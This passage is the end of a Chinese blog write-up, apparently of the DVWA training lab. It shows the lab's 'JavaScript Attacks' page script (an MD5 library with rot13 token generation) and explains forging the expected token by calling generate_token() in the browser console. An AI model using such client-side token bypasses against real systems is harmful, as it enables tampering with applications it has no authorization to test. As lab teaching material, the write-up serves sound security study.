+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">MD5 code from here</span><br><span class="line">https://github.com/blueimp/JavaScript-MD5</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">!function(n)&#123;&quot;use strict&quot;;function t(n,t)&#123;var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r&#125;function r(n,t)&#123;return n&lt;&lt;t|n&gt;&gt;&gt;32-t&#125;function e(n,e,o,u,c,f)&#123;return t(r(t(t(e,n),t(u,f)),c),o)&#125;function o(n,t,r,o,u,c,f)&#123;return e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;function u(n,t,r,o,u,c,f)&#123;return e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;function c(n,t,r,o,u,c,f)&#123;return e(t^r^o,n,t,u,c,f)&#125;function f(n,t,r,o,u,c,f)&#123;return e(r^(t|~o),n,t,u,c,f)&#125;function i(n,r)&#123;n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]&#125;function a(n)&#123;var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r&#125;function d(n)&#123;var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r&#125;function h(n)&#123;return a(i(d(n),8*n.length))&#125;function l(n,t)&#123;var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))&#125;function g(n)&#123;var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e&#125;function v(n)&#123;return unescape(encodeURIComponent(n))&#125;function m(n)&#123;return h(v(n))&#125;function p(n)&#123;return g(m(n))&#125;function s(n,t)&#123;return l(v(n),v(t))&#125;function C(n,t)&#123;return g(s(n,t))&#125;function A(n,t,r)&#123;return t?r?s(t,n):C(t,n):r?m(n):p(n)&#125;&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function()&#123;return A&#125;):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A&#125;(this);</span><br><span class="line"></span><br><span class="line">	function rot13(inp) &#123;</span><br><span class="line">		return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function generate_token() &#123;</span><br><span class="line">		var phrase = document.getElementById(&quot;phrase&quot;).value;</span><br><span class="line">		document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	generate_token();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>就是这个脚本生产了MD5类型的token，而这个被计算MD5值的字段就是输入框中的字段。所以说这是前台生成的token，而网页刚开始生成的是字段ChangeMe的MD5值，而要求是要提交success的MD5值，那么可以输入success后在控制台再调用一次generate_token()函数，即可通过。</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210227154511763.png" alt="image-20210227154511763"></p>
+<p>然后控制台调用generate_token()</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210227154552439.png" alt="image-20210227154552439"></p>
+<p>成功提交</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210227154602978.png" alt="image-20210227154602978"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/02/02/PHPserialize/" rel="prev" title="PHPSerialize">
+      <i class="fa fa-chevron-left"></i> PHPSerialize
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/02/02/CTF_Web%E5%9F%BA%E7%A1%80/" rel="next" title="CTF-web基础">
+      CTF-web基础 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Brute-Force"><span class="nav-number">1.</span> <span class="nav-text">0x01  Brute Force</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Command-Injection"><span class="nav-number">2.</span> <span class="nav-text">0x02 Command Injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Cross-Site-Request-Forgery-CSRF"><span class="nav-number">3.</span> <span class="nav-text">0x03 Cross Site Request Forgery (CSRF)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-File-Inclusion"><span class="nav-number">4.</span> <span class="nav-text">0x04 File Inclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-File-Upload"><span class="nav-number">5.</span> <span class="nav-text">0x05 File Upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Insecure-CAPTCHA"><span class="nav-number">6.</span> <span class="nav-text">0x06 Insecure CAPTCHA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-SQL-Injection"><span class="nav-number">7.</span> <span class="nav-text">0x07 SQL Injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-SQL-Injection-Blind"><span class="nav-number">8.</span> <span class="nav-text">0x08 SQL Injection (Blind)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">8.1.</span> <span class="nav-text">1.基于布尔的盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">8.2.</span> <span class="nav-text">2.基于时间的盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-Weak-Session-IDs"><span class="nav-number">9.</span> <span class="nav-text">0x09 Weak Session IDs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0A-DOM-Based-Cross-Site-Scripting-XSS"><span class="nav-number">10.</span> <span class="nav-text">0x0A DOM Based Cross Site Scripting (XSS)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0B-Reflected-Cross-Site-Scripting-XSS"><span class="nav-number">11.</span> <span class="nav-text">0x0B Reflected Cross Site Scripting (XSS)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X0C-Stored-Cross-Site-Scripting-XSS"><span class="nav-number">12.</span> <span class="nav-text">0X0C Stored Cross Site Scripting (XSS)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0D-Content-Security-Policy-CSP-Bypass"><span class="nav-number">13.</span> <span class="nav-text">0x0D Content Security Policy (CSP) Bypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0E-JavaScript-Attacks"><span class="nav-number">14.</span> <span class="nav-text">0x0E JavaScript Attacks</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ka1t4v"
+      src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/config/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Ka1t4v</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ka1t4v" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ka1t4v" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:ka1t4v@gmail.com" title="E-Mail → mailto:ka1t4v@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ka1t4v</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
